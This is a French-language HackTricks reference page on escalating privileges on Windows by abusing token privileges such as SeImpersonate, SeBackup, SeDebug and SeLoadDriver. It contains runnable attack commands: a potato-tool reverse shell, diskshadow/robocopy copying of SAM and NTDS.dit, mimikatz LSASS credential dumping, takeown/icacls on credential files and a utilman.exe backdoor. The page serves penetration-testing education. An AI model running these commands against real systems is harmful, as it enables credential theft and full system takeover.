# Abus de Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si vous **ne savez pas ce que sont les Windows Access Tokens**, consultez cette page avant de continuer :


{{#ref}}
access-tokens.md
{{#endref}}

**Il est peut-être possible d'escalader vos privilèges en abusant des tokens que vous possédez déjà**

### SeImpersonatePrivilege

Ce privilège, détenu par tout processus, permet l'impersonation (mais pas la création) de n'importe quel token, à condition de pouvoir obtenir un handle vers celui-ci. Un token privilégié peut être obtenu depuis un service Windows (DCOM) en l'incitant à effectuer une authentification NTLM contre un exploit, ce qui permet ensuite l'exécution d'un processus avec les privilèges SYSTEM.<sup>[[2]](#references)</sup> Cette vulnérabilité peut être exploitée à l'aide de différents outils, tels que [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (qui nécessite que winrm soit désactivé), [SweetPotato](https://github.com/CCob/SweetPotato) et [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Notes modernes pour les opérateurs :

- **JuicyPotato est obsolète** : sous Windows 10 1809+/Server 2019+, préférez **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ou **PrintSpoofer**, selon la surface RPC/COM encore accessible.
- Si vous avez compromis un service exécuté en tant que **`LOCAL SERVICE`** ou **`NETWORK SERVICE`** et que `whoami /priv` affiche un **filtered token** sans `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, récupérez d'abord l'**ensemble de privilèges par défaut** du compte (par exemple avec **FullPowers**), puis réessayez ensuite avec la famille potato.<sup>[[3]](#references)</sup>
- Certains forks plus récents sont plus pratiques pour les opérateurs que les outils originaux. Par exemple, **SigmaPotato** ajoute l'exécution par reflection/en mémoire ainsi qu'une compatibilité avec les versions modernes de Windows, tandis que **PrintNotifyPotato** exploite le service COM PrintNotify et est souvent utile lorsque la voie classique via Spooler est désactivée.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Il est très similaire à **SeImpersonatePrivilege** et utilise la **même méthode** pour obtenir un token privilégié.\
Ensuite, ce privilège permet **d'assigner un token primaire** à un nouveau processus ou à un processus suspendu. Avec le token d'usurpation privilégié, il est possible de dériver un token primaire (DuplicateTokenEx).\
Avec ce token, vous pouvez créer un **nouveau processus** avec 'CreateProcessAsUser', ou créer un processus suspendu et **définir le token** (en général, vous ne pouvez pas modifier le token primaire d'un processus en cours d'exécution).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Si ce token est activé, vous pouvez utiliser **KERB_S4U_LOGON** pour obtenir un **token d'usurpation** pour n'importe quel autre utilisateur sans connaître ses identifiants, **ajouter un groupe arbitraire** (admins) au token, définir le **niveau d'intégrité** du token sur "**medium**", puis assigner ce token au **thread actuel** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ce privilège permet au système **d'accorder un accès en lecture complet** à n'importe quel fichier (limité aux opérations de lecture). Il est utilisé pour **lire les hachages des mots de passe des comptes Administrator locaux** depuis le registre, après quoi des outils comme "**psexec**" ou "**wmiexec**" peuvent être utilisés avec le hachage (technique Pass-the-Hash). Cependant, cette technique échoue dans deux cas : lorsque le compte Local Administrator est désactivé ou lorsqu'une stratégie supprime les droits administratifs des Local Administrators qui se connectent à distance.<sup>[[2]](#references)</sup>\
En pratique, le workflow intégré le plus fiable est généralement **VSS + `robocopy /b`** : créer/exposer une copie instantanée, puis copier `SAM`/`SYSTEM` ou `NTDS.dit` en **mode sauvegarde**, ce qui contourne les ACL des fichiers.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Vous pouvez **abuser de ce privilege** avec :

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- en suivant **IppSec** dans [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou comme expliqué dans la section **escalating privileges with Backup Operators** de :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Cette privilege fournit un **accès en écriture** à tout fichier système, indépendamment de sa Access Control List (ACL). Elle ouvre de nombreuses possibilités d'escalade, notamment la capacité de **modifier des services**, d'effectuer du DLL Hijacking et de définir des **debuggers** via les Image File Execution Options, entre autres techniques.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege est une permission puissante, particulièrement utile lorsqu'un utilisateur possède la capacité d'emprunter l'identité de tokens, mais également en l'absence de SeImpersonatePrivilege. Cette capacité dépend de la possibilité d'emprunter l'identité d'un token représentant le même utilisateur et dont le niveau d'intégrité ne dépasse pas celui du processus actuel.<sup>[[2]](#references)</sup>

**Points clés :**

- **Impersonation sans SeImpersonatePrivilege :** il est possible d'exploiter SeCreateTokenPrivilege pour effectuer une EoP en empruntant l'identité de tokens dans certaines conditions.
- **Conditions pour l'emprunt d'identité d'un token :** l'emprunt d'identité réussi exige que le token cible appartienne au même utilisateur et possède un niveau d'intégrité inférieur ou égal au niveau d'intégrité du processus qui tente l'emprunt d'identité.
- **Création et modification de tokens d'emprunt d'identité :** les utilisateurs peuvent créer un token d'emprunt d'identité et le renforcer en y ajoutant le SID (Security Identifier) d'un groupe privilégié.

### SeLoadDriverPrivilege

Cette privilege permet de **charger et décharger des pilotes de périphériques** en créant une entrée de registre avec des valeurs spécifiques pour `ImagePath` et `Type`. Comme l'accès direct en écriture à `HKLM` (HKEY_LOCAL_MACHINE) est restreint, `HKCU` (HKEY_CURRENT_USER) doit être utilisé à la place. Toutefois, pour que le kernel reconnaisse `HKCU` lors de la configuration du pilote, un chemin spécifique doit être suivi.<sup>[[2]](#references)</sup>

L'utilisation offensive moderne repose généralement sur le **BYOVD** (bring your own vulnerable driver) : charger un pilote kernel **signé mais vulnérable**, puis utiliser ses IOCTL pour désactiver les protections ou obtenir l'exécution de code dans le kernel. Il faut garder à l'esprit que, dans les versions récentes de Windows 11/Server, la **Microsoft vulnerable driver blocklist** et/ou **HVCI/Memory Integrity** empêchent souvent les anciennes chaînes publiques de fonctionner ; par conséquent, les exemples classiques de type `szkg64.sys` ne sont plus universellement fiables.

Ce chemin est `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, où `<RID>` est le Relative Identifier de l'utilisateur actuel. Dans `HKCU`, l'intégralité de ce chemin doit être créée et deux valeurs doivent être définies :<sup>[[2]](#references)</sup>

- `ImagePath`, qui correspond au chemin vers le binaire à exécuter
- `Type`, avec une valeur de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Étapes à suivre :**

1. Accéder à `HKCU` plutôt qu'à `HKLM` en raison des restrictions d'accès en écriture.
2. Créer le chemin `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dans `HKCU`, où `<RID>` représente le Relative Identifier de l'utilisateur actuel.
3. Définir `ImagePath` sur le chemin d'exécution du binaire.
4. Attribuer à `Type` la valeur `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Plus de façons d’abuser de ce privilège dans [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ce privilège est similaire à **SeRestorePrivilege**. Sa fonction principale permet à un processus de **prendre possession d’un objet**, en contournant l’obligation d’un accès discrétionnaire explicite grâce à l’attribution de droits d’accès WRITE_OWNER. Le processus consiste d’abord à obtenir la propriété de la clé de registre ciblée à des fins d’écriture, puis à modifier la DACL afin d’autoriser les opérations d’écriture.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ce privilège permet de **déboguer d'autres processus**, notamment de lire et d'écrire dans leur mémoire. Diverses stratégies de memory injection, capables d'échapper à la plupart des solutions antivirus et de prévention des intrusions sur les hôtes, peuvent être utilisées avec ce privilège.<sup>[[2]](#references)</sup>

Sur les versions modernes de Windows, gardez à l'esprit que `SeDebugPrivilege` suffit généralement pour ouvrir les **processus SYSTEM non protégés** et dupliquer leurs tokens, mais ne garantit **pas** que vous pourrez accéder à **LSASS**. Si **RunAsPPL / LSA Protection** est activé, les processus non protégés ne peuvent pas lire LSASS ni y injecter du code, même si `SeDebugPrivilege` est présent. Dans ce cas, volez un token depuis un autre processus SYSTEM non-PPL, ou enchaînez avec un PPL bypass/BYOVD au lieu de supposer que `procdump` fonctionnera. Pour un exemple complet de copie de token utilisant `SeDebugPrivilege` + `SeImpersonatePrivilege`, consultez [cette page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Vous pouvez utiliser [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) pour **capturer la mémoire d'un processus**. Cela peut notamment s'appliquer au processus **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, qui est chargé de stocker les identifiants des utilisateurs une fois qu'un utilisateur s'est connecté avec succès à un système.

Vous pouvez ensuite charger ce dump dans mimikatz pour obtenir les mots de passe :
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Si vous voulez obtenir un shell `NT SYSTEM`, vous pouvez utiliser :

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ce droit (Effectuer des tâches de maintenance des volumes) permet d’ouvrir des handles de périphériques de volume bruts (par exemple, \\.\C:) pour effectuer des entrées/sorties directes sur le disque, en contournant les ACL NTFS. Il permet de copier les octets de n’importe quel fichier du volume en lisant les blocs sous-jacents, ce qui permet la lecture arbitraire de fichiers contenant des informations sensibles (par exemple, les clés privées de la machine dans %ProgramData%\Microsoft\Crypto\, les ruches du registre, SAM/NTDS via VSS).<sup>[[5]](#references)</sup> Il est particulièrement impactant sur les serveurs CA, où l’exfiltration de la clé privée de l’AC permet de forger un Golden Certificate afin d’usurper l’identité de n’importe quel principal.<sup>[[6]](#references)</sup>

Voir les techniques détaillées et les mesures d’atténuation :

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Vérifier les privilèges
```
whoami /priv
```
Les **tokens qui apparaissent comme Disabled** peuvent généralement être activés ; vous pouvez donc souvent exploiter les privilèges _Enabled_ et _Disabled_.

### Activer tous les tokens

Si vous disposez de privilèges désactivés, vous pouvez utiliser le script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) pour activer tous les tokens :
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou le **script** intégré dans ce [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tableau

Cheatsheet complète des privilèges de token à l'adresse [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), le résumé ci-dessous ne répertorie que les moyens directs d'exploiter le privilège pour obtenir une session admin ou lire des fichiers sensibles.<sup>[[1]](#references)</sup>

| Privilège                  | Impact      | Outil                    | Chemin d'exécution                                                                                                                                                                                                                                                                                                                                     | Remarques                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | outil tiers          | _"Cela permettrait à un utilisateur d'usurper des tokens et de faire une privesc vers nt system à l'aide d'outils tels que potato.exe, rottenpotato.exe et juicypotato.exe"_                                                                                                                                                                                                      | Merci à [Aurélien Chalot](https://twitter.com/Defte_) pour la mise à jour. J'essaierai bientôt de reformuler cela sous une forme plus proche d'une recette.                                                                                                                                                                                         |
| **`SeBackup`**             | **Menace**  | _**Commandes intégrées**_ | Lire des fichiers sensibles avec `robocopy /b` ou des helpers de copie dédiés compatibles avec SeBackup.                                                                                                                                                                                                                                                                 | <p>- Très utile pour `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` et parfois `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` est pratique, mais les cmdlets/APIs SeBackup dédiées sont souvent plus flexibles pour les fichiers verrouillés/ouverts.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | outil tiers          | Créer un token arbitraire incluant des droits d'admin local avec `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliquer un token SYSTEM **non-PPL** ou dumper la mémoire d'un processus non protégé.                                                                                                                                                                                                                                                                 | <p>Le dumping de LSASS est généralement bloqué si RunAsPPL/LSA Protection est activé.</p><p>Script disponible sur [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | outil tiers          | Utiliser la **famille Potato** / l'usurpation via named pipe pour lancer SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Particulièrement pratique depuis des comptes de service tels que IIS APPPOOL, MSSQL, des scheduled tasks ou tout contexte qui possède déjà `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | outil tiers          | <p>1. Charger un kernel driver signé mais vulnérable (BYOVD)<br>2. Utiliser les IOCTL du driver pour obtenir des droits R/W kernel, désactiver les outils de sécurité ou obtenir les droits SYSTEM<br><br>Alternativement, le privilège peut être utilisé pour décharger des drivers liés à la sécurité avec la commande builtin <code>fltMC</code>, par exemple <code>fltMC sysmondrv</code></p>                     | <p>Les anciens drivers publics tels que <code>szkg64.sys</code> sont de plus en plus bloqués sur les versions modernes de Windows par la vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Lancer PowerShell/ISE avec le privilège SeRestore présent.<br>2. Activer le privilège avec <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renommer utilman.exe en utilman.old<br>4. Renommer cmd.exe en utilman.exe<br>5. Verrouiller la console et appuyer sur Win+U</p> | <p>L'attaque peut être détectée par certains logiciels AV.</p><p>Une méthode alternative repose sur le remplacement des service binaries stockés dans "Program Files" à l'aide du même privilège</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Commandes intégrées**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renommer cmd.exe en utilman.exe<br>4. Verrouiller la console et appuyer sur Win+U</p>                                                                                                                                       | <p>L'attaque peut être détectée par certains logiciels AV.</p><p>Une méthode alternative repose sur le remplacement des service binaries stockés dans "Program Files" à l'aide du même privilège.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | outil tiers          | <p>Manipuler les tokens afin d'y inclure des droits d'admin local. Peut nécessiter SeImpersonate.</p><p>À vérifier.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Références

- [1] [gtworek/Priv2Admin - chemins d'exploitation des privilèges Windows vers admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
